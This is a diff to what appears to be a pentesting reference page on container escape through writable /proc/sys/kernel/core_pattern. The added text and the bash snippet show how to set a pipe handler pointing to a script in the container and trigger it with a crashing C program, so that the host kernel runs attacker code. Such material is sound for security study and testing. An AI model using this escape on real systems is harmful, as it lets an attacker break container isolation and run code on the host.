@@ -15,15 +15,31 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
+- If you can write inside this file it's possible to write a pipe `|` followed by the path to a program or script that will be exuted after a crash happens.
+-  An attacker can find the path inside the host to his container executing `mount` and write the path to a binary inside his container file system. Then, crash a program to make the kernel execute the binary outside of the container.
+
 - **Testing and Exploitation Example**:
 
-  ```bash
-  [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
-  cd /proc/sys/kernel
-  echo "|$overlay/shell.sh" > core_pattern # Set custom handler
-  sleep 5 && ./crash & # Trigger handler
-  ```
+```bash
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
+cd /proc/sys/kernel
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
+```
+
+Check [this post](https://pwning.systems/posts/escaping-containers-for-fun/) for more information.
+
+Example program taht crashes:
+
+```c
+int main(void) {
+	char buf[1];
+	for (int i = 0; i < 100; i++) {
+		buf[i] = 1;
+	}
+	return 0;
+}
+```
 
 #### **`/proc/sys/kernel/modprobe`**
 
